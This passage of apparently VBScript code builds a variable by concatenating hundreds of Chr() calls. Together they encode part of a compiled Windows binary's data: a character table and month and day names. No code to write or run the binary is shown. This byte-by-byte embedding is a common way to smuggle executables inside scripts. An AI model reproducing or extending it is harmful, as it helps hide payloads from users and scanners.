gfoN=gfoN&Chr(129)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(130)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)
gfoN=gfoN&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(2)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(104)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)&Chr(40)&Chr(0)
gfoN=gfoN&Chr(40)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(132)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)
gfoN=gfoN&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(129)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(130)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)
gfoN=gfoN&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(32)&Chr(0)&Chr(72)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)
gfoN=gfoN&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(20)&Chr(0)&Chr(20)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(20)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(16)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)
gfoN=gfoN&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(16)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(16)&Chr(0)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(2)&Chr(1)&Chr(1)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)
gfoN=gfoN&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)
gfoN=gfoN&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)
gfoN=gfoN&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)&Chr(96)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)
gfoN=gfoN&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)
gfoN=gfoN&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)
gfoN=gfoN&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(0)&Chr(1)&Chr(2)&Chr(3)&Chr(4)&Chr(5)&Chr(6)&Chr(7)&Chr(8)&Chr(9)&Chr(10)&Chr(11)&Chr(12)&Chr(13)&Chr(14)&Chr(15)&Chr(16)&Chr(17)&Chr(18)&Chr(19)&Chr(20)&Chr(21)&Chr(22)&Chr(23)&Chr(24)&Chr(25)&Chr(26)&Chr(27)&Chr(28)&Chr(29)&Chr(30)&Chr(31)&Chr(32)&Chr(33)&Chr(34)&Chr(35)&Chr(36)&Chr(37)&Chr(38)&Chr(39)&Chr(40)&Chr(41)&Chr(42)&Chr(43)&Chr(44)&Chr(45)&Chr(46)&Chr(47)&Chr(48)&Chr(49)&Chr(50)&Chr(51)&Chr(52)&Chr(53)&Chr(54)&Chr(55)&Chr(56)&Chr(57)&Chr(58)&Chr(59)&Chr(60)&Chr(61)&Chr(62)&Chr(63)&Chr(64)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(91)&Chr(92)&Chr(93)&Chr(94)&Chr(95)
gfoN=gfoN&Chr(96)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(123)&Chr(124)&Chr(125)&Chr(126)&Chr(127)&Chr(128)&Chr(129)&Chr(130)&Chr(131)&Chr(132)&Chr(133)&Chr(134)&Chr(135)&Chr(136)&Chr(137)&Chr(138)&Chr(139)&Chr(140)&Chr(141)&Chr(142)&Chr(143)&Chr(144)&Chr(145)&Chr(146)&Chr(147)&Chr(148)&Chr(149)&Chr(150)&Chr(151)&Chr(152)&Chr(153)&Chr(154)&Chr(155)&Chr(156)&Chr(157)&Chr(158)&Chr(159)&Chr(160)&Chr(161)&Chr(162)&Chr(163)&Chr(164)&Chr(165)&Chr(166)&Chr(167)&Chr(168)&Chr(169)&Chr(170)&Chr(171)&Chr(172)&Chr(173)&Chr(174)&Chr(175)&Chr(176)&Chr(177)&Chr(178)&Chr(179)&Chr(180)&Chr(181)&Chr(182)&Chr(183)&Chr(184)&Chr(185)&Chr(186)&Chr(187)&Chr(188)&Chr(189)&Chr(190)&Chr(191)&Chr(192)&Chr(193)&Chr(194)&Chr(195)
gfoN=gfoN&Chr(196)&Chr(197)&Chr(198)&Chr(199)&Chr(200)&Chr(201)&Chr(202)&Chr(203)&Chr(204)&Chr(205)&Chr(206)&Chr(207)&Chr(208)&Chr(209)&Chr(210)&Chr(211)&Chr(212)&Chr(213)&Chr(214)&Chr(215)&Chr(216)&Chr(217)&Chr(218)&Chr(219)&Chr(220)&Chr(221)&Chr(222)&Chr(223)&Chr(224)&Chr(225)&Chr(226)&Chr(227)&Chr(228)&Chr(229)&Chr(230)&Chr(231)&Chr(232)&Chr(233)&Chr(234)&Chr(235)&Chr(236)&Chr(237)&Chr(238)&Chr(239)&Chr(240)&Chr(241)&Chr(242)&Chr(243)&Chr(244)&Chr(245)&Chr(246)&Chr(247)&Chr(248)&Chr(249)&Chr(250)&Chr(251)&Chr(252)&Chr(253)&Chr(254)&Chr(255)&Chr(72)&Chr(72)&Chr(58)&Chr(109)&Chr(109)&Chr(58)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(100)&Chr(100)&Chr(100)&Chr(44)&Chr(32)&Chr(77)&Chr(77)&Chr(77)&Chr(77)&Chr(32)&Chr(100)&Chr(100)&Chr(44)&Chr(32)&Chr(121)&Chr(121)&Chr(121)&Chr(121)&Chr(0)&Chr(77)&Chr(77)&Chr(47)&Chr(100)&Chr(100)&Chr(47)&Chr(121)&Chr(121)
gfoN=gfoN&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(77)&Chr(0)&Chr(0)&Chr(65)&Chr(77)&Chr(0)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(78)&Chr(111)&Chr(118)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(79)&Chr(99)&Chr(116)&Chr(111)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(83)&Chr(101)&Chr(112)&Chr(116)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(117)&Chr(103)&Chr(117)&Chr(115)&Chr(116)&Chr(0)&Chr(0)&Chr(74)&Chr(117)&Chr(108)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(117)&Chr(110)&Chr(101)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(112)&Chr(114)&Chr(105)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(77)&Chr(97)&Chr(114)&Chr(99)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(101)&Chr(98)&Chr(114)
gfoN=gfoN&Chr(117)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(117)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(0)&Chr(78)&Chr(111)&Chr(118)&Chr(0)&Chr(79)&Chr(99)&Chr(116)&Chr(0)&Chr(83)&Chr(101)&Chr(112)&Chr(0)&Chr(65)&Chr(117)&Chr(103)&Chr(0)&Chr(74)&Chr(117)&Chr(108)&Chr(0)&Chr(74)&Chr(117)&Chr(110)&Chr(0)&Chr(77)&Chr(97)&Chr(121)&Chr(0)&Chr(65)&Chr(112)&Chr(114)&Chr(0)&Chr(77)&Chr(97)&Chr(114)&Chr(0)&Chr(70)&Chr(101)&Chr(98)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(0)&Chr(83)&Chr(97)&Chr(116)&Chr(117)&Chr(114)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(114)&Chr(105)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(84)&Chr(104)&Chr(117)&Chr(114)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(101)&Chr(100)&Chr(110)
gfoN=gfoN&Chr(101)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(117)&Chr(101)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(77)&Chr(111)&Chr(110)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(83)&Chr(97)&Chr(116)&Chr(0)&Chr(70)&Chr(114)&Chr(105)&Chr(0)&Chr(84)&Chr(104)&Chr(117)&Chr(0)&Chr(87)&Chr(101)&Chr(100)&Chr(0)&Chr(84)&Chr(117)&Chr(101)&Chr(0)&Chr(77)&Chr(111)&Chr(110)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(0)&Chr(200)&Chr(178)&Chr(64)&Chr(0)&Chr(32)&Chr(179)&Chr(64)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(77)&Chr(111)&Chr(110)&Chr(84)&Chr(117)&Chr(101)&Chr(87)&Chr(101)&Chr(100)&Chr(84)&Chr(104)&Chr(117)&Chr(70)&Chr(114)&Chr(105)&Chr(83)&Chr(97)&Chr(116)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(70)&Chr(101)&Chr(98)&Chr(77)&Chr(97)
gfoN=gfoN&Chr(114)&Chr(65)&Chr(112)&Chr(114)&Chr(77)&Chr(97)&Chr(121)&Chr(74)&Chr(117)&Chr(110)&Chr(74)&Chr(117)&Chr(108)&Chr(65)&Chr(117)&Chr(103)&Chr(83)&Chr(101)&Chr(112)&Chr(79)&Chr(99)&Chr(116)&Chr(78)&Chr(111)&Chr(118)&Chr(68)&Chr(101)&Chr(99)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(72)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(248)&Chr(169)&Chr(64)&Chr(0)
